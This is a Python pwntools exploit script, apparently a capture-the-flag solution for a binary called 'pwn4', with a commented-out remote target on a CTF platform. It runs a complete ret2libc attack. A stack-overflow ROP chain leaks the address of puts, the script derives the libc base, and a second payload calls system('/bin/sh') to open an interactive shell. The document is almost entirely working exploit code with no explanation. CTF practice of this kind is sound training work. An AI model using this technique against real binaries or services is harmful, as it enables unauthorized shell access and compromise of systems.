from pwn import *

context.gdb_binary = "/bin/pwndbg"
context.log_level = "info"

io = process("./pwn4")
#io = remote("node4.anna.nssctf.cn", 29526)
elf = ELF("./pwn4")
libc = ELF("./libc-2.31.so")

pop_rdi_addr = 0x4007D3
ret_addr = 0x400556
main_addr = 0x4006B0
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

io.recvuntil(b"message:")
payload = (
    b"\x00" * (0x60 + 0x8)
    + p64(pop_rdi_addr)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(main_addr)
)
io.sendline(payload)
io.recvuntil(b"Received\n")

puts_addr = u64(io.recv(6).ljust(8, b"\x00"))

print(f"puts address: {hex(puts_addr)}")
libc_base = puts_addr - libc.sym["puts"]
print(f"libc base address = {hex(libc_base)}")
system_addr = libc_base + libc.sym["system"]
print(f"system address = {hex(system_addr)}")
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print(f"/bin/sh address = {hex(binsh_addr)}")

payload = (
    b"\x00" * (0x60 + 0x8)
    + p64(ret_addr)
    + p64(pop_rdi_addr)
    + p64(binsh_addr)
    + p64(system_addr)
)
io.recvuntil(b"message:")
io.sendline(payload)
io.interactive()
